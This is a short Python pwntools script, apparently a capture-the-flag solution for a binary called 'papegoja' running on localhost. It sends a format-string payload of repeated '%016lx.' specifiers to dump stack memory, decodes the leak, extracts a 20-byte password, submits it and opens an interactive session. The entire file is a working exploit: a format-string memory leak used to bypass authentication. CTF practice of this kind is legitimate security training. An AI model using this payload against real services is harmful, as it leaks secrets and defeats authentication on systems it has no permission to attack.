#!/usr/bin/env python3
from pwn import *

#r = process("./papegoja")
r = remote("localhost", 50000)

r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"%016lx."*20)
r.readuntil(b"Polly says: ")
leak = r.readline().strip(b"\n").strip(b".")
data = b"".join([p64(int(x, 16)) for x in  leak.split(b".")])
password = data[72:72 + 20]
print(password)

r.sendlineafter(b"> ", b"2")
r.sendline(password)

r.interactive()
